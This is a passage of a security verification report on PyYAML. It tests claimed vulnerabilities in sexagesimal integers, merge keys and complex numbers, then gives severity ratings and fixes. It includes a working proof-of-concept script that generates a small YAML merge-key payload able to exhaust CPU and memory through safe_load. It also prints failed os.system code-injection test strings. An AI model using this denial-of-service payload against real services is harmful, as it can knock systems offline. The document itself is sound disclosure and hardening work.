| < 3.11 | **MEDIUM** | No built-in integer size limit |
| >= 3.11 | **LOW** | Protected by int_max_str_digits |

### Proof of Concept

```python
#!/usr/bin/env python3
"""VULN-006 PoC: Sexagesimal Integer Parsing"""
import sys
import yaml

# Disable protection for testing (Python 3.11+)
if hasattr(sys, 'set_int_max_str_digits'):
    sys.set_int_max_str_digits(0)

# Create 100,000 segment sexagesimal number
payload = 'num: ' + ':'.join(['59'] * 100000)
print(f"Payload size: {len(payload) / 1024:.1f} KB")

result = yaml.safe_load(payload)
# Takes ~2.7 seconds and 13 MB memory
# Not catastrophic, but noticeable
```

### Key Insight

The original claim confused two different things:

1. **Mathematical growth:** 60^n grows exponentially
2. **Computational cost:** O(n) - grows linearly with input

The computation doesn't recalculate 60^n for each segment - it just multiplies `base *= 60` which is O(1) for Python bigints. The total cost is O(n) where n is input size.

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| Sexagesimal creates large numbers | 59:59:59 â†’ 215,999 | âœ… True |
| More efficient than decimal | 0.6 digits per byte vs 1.0 | âŒ False |
| Exponential complexity | Linear time scaling | âŒ False |
| Can cause DoS | Only with MB-sized inputs | âš ï¸ Partial |
| Python 3.11 protected | int_max_str_digits limit | âœ… True |

### Final Verdict

**âš ï¸ VULN-006 is OVERSTATED**

- âœ… Sexagesimal CAN create large integers (TRUE)
- âŒ More efficient than decimal (FALSE - actually less efficient)
- âŒ Exponential complexity (FALSE - linear)
- âš ï¸ DoS potential (PARTIAL - requires large payloads, mitigated in Python 3.11+)

**Severity: LOW** (Python 3.11+) to **MEDIUM** (Python < 3.11)

---

## VULN-008: Merge Key Recursion

### Original Claim
> "The YAML merge key (`<<`) feature can cause stack overflow or resource exhaustion through deep recursion or exponential expansion when processing nested merge structures."

### Verification Process

#### Test 1: Understanding Merge Keys

```yaml
base: &base
  name: "default"
  value: 100

extended:
  <<: *base        # Merge base into extended
  value: 200       # Override value
```

**Result:** Basic merge keys work as expected. The `flatten_mapping()` function recursively processes merged mappings.

#### Test 2: Deep Merge Chains (Linear)

```yaml
m0: &m0
  key: value
m1: &m1
  <<: *m0
  k1: v1
m2: &m2
  <<: *m1
  k2: v2
# ... up to depth N
```

| Depth | Result | Time |
|-------|--------|------|
| 500 | SUCCESS (501 keys) | 0.093s |
| 1000 | SUCCESS (1001 keys) | 0.285s |
| 2000 | SUCCESS (2001 keys) | 1.007s |

**Finding:** Linear merge chains are **NOT problematic** - time scales linearly.

#### Test 3: Merge Sequences (EXPONENTIAL!) ğŸ”´

```yaml
# Each merge references MULTIPLE previous mappings
m0_0: &m0_0
  key0: value0
m0_1: &m0_1
  key1: value1
m0_2: &m0_2
  key2: value2

m1_0: &m1_0
  <<: [*m0_0, *m0_1, *m0_2]  # Merges all 3!
  k1_0: v1_0
# ... continuing to depth D
```

| Width | Depth | Time | Memory | Operations |
|-------|-------|------|--------|------------|
| 2 | 13 | 0.13s | 719 KB | 8,192 |
| 2 | 15 | 0.51s | 2.6 MB | 32,768 |
| 3 | 11 | 2.30s | 11.5 MB | 177,147 |
| 3 | 13 | **21.1s** | **100.5 MB** | 1,594,323 |

**Time growth ratio verification:**

| Transition | Actual Ratio | Expected (widthÂ²) |
|------------|--------------|-------------------|
| Width=3: Depth 9â†’11 | 8.8x | 9x |
| Width=3: Depth 11â†’13 | 9.1x | 9x |

**Result:** âœ… CONFIRMED EXPONENTIAL - Time grows as O(width^depth)

#### Test 4: Amplification Factor

| Payload | Size | Operations | Amplification |
|---------|------|------------|---------------|
| Width=3, Depth=13 | 2.2 KB | 1,594,323 | **713x** |
| Width=3, Depth=15 | 2.5 KB | 14,348,907 | **5,527x** |
| Width=3, Depth=17 | 2.9 KB | 129,140,163 | **43,687x** |

#### Test 5: PyYAML Source Analysis

```python
# From lib/yaml/constructor.py:180
def flatten_mapping(self, node):
    merge = []
    index = 0
    while index < len(node.value):
        key_node, value_node = node.value[index]
        if key_node.tag == 'tag:yaml.org,2002:merge':
            # ...
            if isinstance(value_node, MappingNode):
                self.flatten_mapping(value_node)  # Recursive!
            elif isinstance(value_node, SequenceNode):
                for subnode in value_node.value:
                    self.flatten_mapping(subnode)  # Recursive for EACH!
```

**Findings:**
- âŒ NO depth limit in `flatten_mapping()`
- âŒ NO iteration limit
- âŒ NO protection against exponential expansion

### Why This Is Different from VULN-001

| Vulnerability | How Expansion Works | Complexity |
|---------------|---------------------|------------|
| VULN-001 (Aliases) | Creates **references** to same object | O(n) - Linear |
| VULN-008 (Merge) | Actually **processes** each merge | O(width^depth) - Exponential |

The key difference:
- Aliases: `*a` is just a pointer to existing node
- Merge: `<<: [*a, *b, *c]` calls `flatten_mapping()` for EACH referenced mapping, and those mappings may also have merges, creating exponential recursion.

### Proof of Concept

```python
#!/usr/bin/env python3
"""VULN-008 PoC: Merge Key Exponential DoS"""
import yaml

# Generate exponential merge payload
width = 3
depth = 13

lines = []
# Initial anchors
for w in range(width):
    lines.append(f"m0_{w}: &m0_{w}")
    lines.append(f"  key{w}: value{w}")

# Build merge chain
for d in range(1, depth + 1):
    for w in range(width):
        lines.append(f"m{d}_{w}: &m{d}_{w}")
        merge_refs = ", ".join([f"*m{d-1}_{i}" for i in range(width)])
        lines.append(f"  <<: [{merge_refs}]")  # Merge ALL from previous level
        lines.append(f"  k{d}_{w}: v{d}_{w}")

lines.append(f"final: *m{depth}_0")
payload = "\n".join(lines)

print(f"Payload size: {len(payload):,} bytes ({len(payload)/1024:.1f} KB)")
print(f"Expected operations: {width**depth:,}")
print("Parsing... (this will take ~21 seconds)")

result = yaml.safe_load(payload)  # DoS!
print(f"Done - {len(result['final'])} keys")
```

### Attack Scenario

```
Attacker â†’ 2.2 KB YAML payload with merge sequences
         â†“
Server   â†’ yaml.safe_load(payload)
         â†“
Server   â†’ flatten_mapping() runs 1.6 million times
         â†“
Result   â†’ 21 seconds CPU, 100 MB memory
         â†“
Impact   â†’ Denial of Service
```

**Even SafeLoader is vulnerable!** This attack works with `yaml.safe_load()`.

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "Deep recursion causes stack overflow" | âš ï¸ **PARTIAL** - Linear chains are fine |
| "Merge sequences cause exponential explosion" | âœ… **TRUE** - Verified |
| "No depth/iteration limits" | âœ… **TRUE** - Confirmed |
| "DoS via small payload" | âœ… **TRUE** - 2.2KB â†’ 21s CPU |

### Severity Assessment

| Factor | Assessment |
|--------|------------|
| Attack Complexity | **LOW** - Small payload |
| Impact | **HIGH** - CPU and memory exhaustion |
| SafeLoader Protected? | âŒ **NO** - Also vulnerable |
| Requires Special Config? | âŒ **NO** - Default behavior |

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| Linear merge chains cause DoS | Tested to depth 2000 | âŒ False |
| Merge sequences cause exponential work | 9x time per +2 depth | âœ… True |
| No limits in flatten_mapping | Source code analysis | âœ… True |
| Small payload causes major impact | 2.2KB â†’ 21s, 100MB | âœ… True |
| SafeLoader is protected | Tested with safe_load | âŒ False (vulnerable) |

### Deep Analysis: Root Cause

The exponential behavior was verified through extensive tracing:

**What IS exponential:**
- Total key-value pairs in `node.value` after flattening: O(width^depth)
- `construct_object` calls: O(width^depth)

**What is NOT exponential:**
- `flatten_mapping()` call count: O(depth Ã— width) - LINEAR
- Final output keys: O(depth Ã— width) - LINEAR (duplicates removed)

**The Root Cause:**
```python
def flatten_mapping(self, node):
    for subnode in value_node.value:  # For each merge source
        self.flatten_mapping(subnode)  # Recursively flatten
        merge.extend(subnode.value)    # COPY all key-value pairs!
    node.value = merge + node.value    # Accumulate everything
```

When level N merges from width sources at level N-1, each source already has ~width^(N-1) key-value pairs. Total pairs at level N: `width Ã— width^(N-1) + 1 = O(width^N)`.

**Profiling Evidence (depth=11, width=3):**
```
7,218,096 function calls in 1.097 seconds
- construct_object: 2,391,519 calls
- isinstance: 1,199,935 calls
- flatten_mapping: 136 calls (LINEAR!)
```

The exponential work happens in processing the accumulated key-value pairs, NOT in the recursion.

### Minimum Attack Payload Analysis

| Width | Depth | Payload Size | CPU Time | Memory |
|-------|-------|--------------|----------|--------|
| 3 | 10 | 1.7 KB | 0.14s | ~4 MB |
| 3 | 11 | 1.9 KB | 0.42s | 11.3 MB |
| 3 | 12 | **2.0 KB** | **1.28s** | ~34 MB |
| 4 | 10 | 2.5 KB | 2.55s | ~80 MB |
| 5 | 9 | 3.1 KB | ~1.0s | ~30 MB |

**Key Finding: 2.0 KB payload causes 1+ second DoS**

**Memory Amplification: 6,375x** (1.9 KB â†’ 11.3 MB)

### What Mitigations DON'T Work

| Mitigation | Effectiveness | Why |
|------------|--------------|-----|
| SafeLoader | âŒ None | Fully vulnerable |
| Input size limit | âŒ Poor | 2KB is tiny |
| Python recursion limit | âŒ None | Not a recursion issue |
| Checking for deep nesting | âŒ None | Structure is shallow |

### What Mitigations DO Work

| Mitigation | Effectiveness | Implementation |
|------------|--------------|----------------|
| Pattern detection | âœ… Good | Block `<<: [` in input |
| OS timeout | âœ… Good | `signal.alarm()` or cgroups |
| Resource limits | âœ… Good | Memory/CPU cgroups |
| Merge count limit | âœ… Best | Track in PyYAML (not implemented) |

### Final Verdict

**âœ… VULN-008 is CONFIRMED**

This is a **legitimate HIGH severity vulnerability**:

- âœ… Exponential complexity O(width^depth) verified through profiling
- âœ… **2.0 KB payload â†’ 1.3 seconds CPU**, 34 MB memory
- âœ… Memory amplification: **6,375x**
- âœ… Affects ALL loaders including SafeLoader
- âœ… No built-in protection exists
- âœ… Root cause identified: key-value pair accumulation in `flatten_mapping()`

**Severity: HIGH**

This is the most serious confirmed vulnerability in this analysis because:
1. It affects SafeLoader (supposedly safe for untrusted input)
2. It creates true exponential resource consumption
3. The payload is small and easy to construct (2KB)
4. No mitigations exist in PyYAML
5. Root cause is fundamental to current implementation

### Mitigation Recommendations

**For PyYAML maintainers:**
1. Add iteration limit to `flatten_mapping()`:
   ```python
   def flatten_mapping(self, node, _depth=0):
       if _depth > 100:
           raise ConstructorError("merge key nesting too deep")
       # ... existing code ...
       self.flatten_mapping(value_node, _depth + 1)
   ```

2. Track total merge operations:
   ```python
   self.merge_count += 1
   if self.merge_count > 10000:
       raise ConstructorError("too many merge operations")
   ```

**For application developers:**
1. Limit input size before parsing
2. Set parse timeouts if possible
3. Monitor resource usage
4. Consider preprocessing to detect merge sequences

### Comparison with libfyaml (C YAML Parser)

Testing revealed that **libfyaml is NOT vulnerable** to this attack:

#### Time Comparison

| Depth | PyYAML | libfyaml | Speedup |
|-------|--------|----------|---------|
| 10 | 0.16s | 0.001s | **160x** |
| 11 | 0.45s | 0.001s | **450x** |
| 12 | 1.25s | 0.001s | **1,250x** |
| 13 | 3.68s | 0.002s | **1,840x** |
| 14 | 11.09s | 0.002s | **5,545x** |
| 15 | 33.51s | 0.002s | **16,755x** |

#### Memory Comparison (THE CRITICAL ISSUE)

| Depth | Payload | PyYAML Memory | libfyaml Memory | Ratio |
|-------|---------|---------------|-----------------|-------|
| 10 | 1.7 KB | 16 MB | 2.5 MB | 6x |
| 11 | 1.9 KB | 24 MB | 2.5 MB | 10x |
| 12 | 2.0 KB | 49 MB | 2.5 MB | 20x |
| 13 | 2.2 KB | 124 MB | 2.5 MB | 50x |
| 14 | 2.4 KB | 348 MB | 2.6 MB | 134x |
| 15 | **2.6 KB** | **965 MB** | 2.8 MB | **344x** |

**Memory Amplification at Depth 15: 380,000x** (2.6 KB â†’ 965 MB)

#### Memory Growth Rate

PyYAML memory grows exponentially (~3x per depth level):
- Depth 12â†’13: 49 MB â†’ 124 MB = 2.5x
- Depth 13â†’14: 124 MB â†’ 348 MB = 2.8x
- Depth 14â†’15: 348 MB â†’ 965 MB = 2.8x

libfyaml memory stays **constant** (~2.5-2.8 MB) regardless of depth.

#### Projected Impact (PyYAML)

| Depth | Payload | Estimated Time | Estimated Memory |
|-------|---------|----------------|------------------|
| 16 | ~2.8 KB | ~100 seconds | **~2.9 GB** |
| 17 | ~3.0 KB | ~300 seconds | **~8.7 GB** |
| 18 | ~3.2 KB | ~15 minutes | **~26 GB** (OOM) |

**A 3 KB payload can crash most systems via memory exhaustion.**

**Why libfyaml is immune:**

libfyaml checks for duplicate keys BEFORE adding them during merge resolution:

```c
// libfyaml/src/lib/fy-doc.c:2731-2736
for (fynpi = ...) {
    /* if we don't allow duplicate keys */
    if (!(fyd->parse_cfg.flags & FYPCF_ALLOW_DUPLICATE_KEYS)) {
        /* make sure we don't override an already existing key */
        if (fy_node_mapping_key_is_duplicate(fyn, fynpi->key))
            continue;  // SKIP - don't add duplicate!
    }
    // ... only add if not duplicate
}
```

**PyYAML's vulnerable approach:**
```python
# PyYAML lib/yaml/constructor.py:188-189
self.flatten_mapping(value_node)
merge.extend(value_node.value)  # Adds ALL pairs, including duplicates!
```

**The Fix:** PyYAML should check `if key not in existing_keys` BEFORE adding each pair to the merge list, similar to libfyaml's approach.

**Complexity comparison:**
- PyYAML: O(width^depth) - accumulates all pairs first, deduplicates later
- libfyaml: O(depth Ã— width) - skips duplicates during accumulation

---

## VULN-007: Complex Number Injection

### Original Claim
> "The complex number constructor passes user input directly to Python's `complex()` function without validation, enabling input validation bypass."

### Verification Process

#### Test 1: Which Loaders Are Affected?

| Loader | Has python/complex? |
|--------|---------------------|
| SafeLoader | âŒ NO |
| FullLoader | âœ… YES |
| UnsafeLoader | âœ… YES |

**SafeLoader is NOT affected.**

#### Test 2: Can complex() Execute Code?

```python
# Attempt code injection
yaml.load('!!python/complex "__import__(\'os\').system(\'id\')"', Loader=yaml.FullLoader)
# Result: ValueError: could not convert string to complex

yaml.load('!!python/complex "exec(\'print(1)\')"', Loader=yaml.FullLoader)
# Result: ValueError: complex() arg is a malformed string
```

**Result:** âŒ NO - `complex()` only parses valid number strings.

#### Test 3: DoS via Large Numbers?

| Input Length | Time | Memory |
|--------------|------|--------|
| 100 digits | 0.0002s | 5.6 KB |
| 1,000 digits | 0.0036s | 8.4 KB |
| 10,000 digits | 0.041s | 43 KB |
| 100,000 digits | 0.41s | 395 KB |

**Result:** âŒ NO - Linear scaling, no DoS potential.

#### Test 4: Special Values

```python
yaml.load('!!python/complex "inf+infj"', Loader=yaml.FullLoader)
# Result: (inf+infj)

yaml.load('!!python/complex "nan+nanj"', Loader=yaml.FullLoader)
# Result: (nan+nanj)
```

**Result:** Can inject inf/nan, but this affects regular floats too.

#### Test 5: Type Confusion

```python
config = yaml.load('threshold: !!python/complex "0.5+0j"', Loader=yaml.FullLoader)
if config['threshold'] > 0.3:  # TypeError!
    pass
# TypeError: '>' not supported between instances of 'complex' and 'float'
```

**Result:** Type confusion possible, but requires:
1. FullLoader (not SafeLoader)
2. Attacker controls YAML input
3. App doesn't validate types

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "Input validation bypass" | âŒ **FALSE** - complex() validates correctly |
| "No validation of user input" | âŒ **FALSE** - invalid input raises ValueError |
| "Security vulnerability" | âŒ **FALSE** - no exploitable impact |

### What Was Found

1. **No code execution** - `complex()` only accepts number strings
2. **No DoS** - Linear time/memory scaling
3. **No bypass** - Invalid input is rejected
4. **SafeLoader protected** - Tag not registered

### Minor Issues (Not Vulnerabilities)

1. **Type confusion**: Complex instead of float (but requires FullLoader + specific app logic)
2. **inf/nan injection**: Can create special values (but same as regular YAML floats)

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| Code execution possible | Tested multiple payloads | âŒ False |
| DoS via large numbers | Linear scaling to 100K digits | âŒ False |
| Input validation bypass | complex() validates correctly | âŒ False |
| SafeLoader affected | Tag not registered | âŒ False |

### Final Verdict

**âŒ VULN-007 is FALSE**

This is not a vulnerability. Python's `complex()` function:
- Validates input correctly
- Rejects malformed strings
- Has linear time complexity
- Cannot execute arbitrary code

The claim of "input validation bypass" is incorrect - there IS validation, performed by Python's `complex()` function itself.

**Severity: N/A (Not a vulnerability)**

---



